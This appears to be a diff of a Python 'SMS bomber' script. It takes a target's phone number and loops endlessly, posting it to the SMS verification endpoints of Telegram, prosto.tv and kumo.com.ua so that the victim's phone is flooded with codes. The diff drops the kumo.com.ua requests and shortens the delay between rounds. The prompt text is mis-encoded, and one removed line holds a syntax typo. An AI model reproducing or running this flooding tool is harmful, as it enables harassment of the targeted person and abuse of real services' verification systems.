@@ -7,7 +7,6 @@ NUMBER = input('Beeante HOMep tenedona: (6es +)')
 
 
 while True:
-
  try:
      print('Отправлено')
      response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': "+" + NUMBER})
@@ -134,28 +133,4 @@ while True:
      response = requests.post('https://prosto.tv/wp-admin/admin-ajax.php', headers=headers, json={'phone' :  NUMBER})
  except:
      print('Не доставлено')
-#kumo.com.ua
- try:
-     print('Отправлено')
-     response = requests.post('https://kumo.com.ua/registration/sms/', headers=headers, data={'phone': "+" + NUMBER})
- except:
-     print('Не доставлено')
-	 
- try:
-     print('Отправлено')
-     response = requests.post('https://kumo.com.ua/registration/sms/', headers-headers, data={'phone' : NUMBER})
- except:
-     print('Не доставлено')
-	 
- try:
-     print('Отправлено')
-     response = requests.post('https://kumo.com.ua/registration/sms/', headers=headers, json={'phone': "+" + NUMBER})
- except:
-     print('Не доставлено')
-	 
- try:
-     print('Отправлено')
-     response = requests.post('https://kumo.com.ua/registration/sms/', headers=headers, json={'phone' :  NUMBER})
- except:
-     print('Не доставлено')
-     time.sleep(5000)
+     time.sleep(1000)
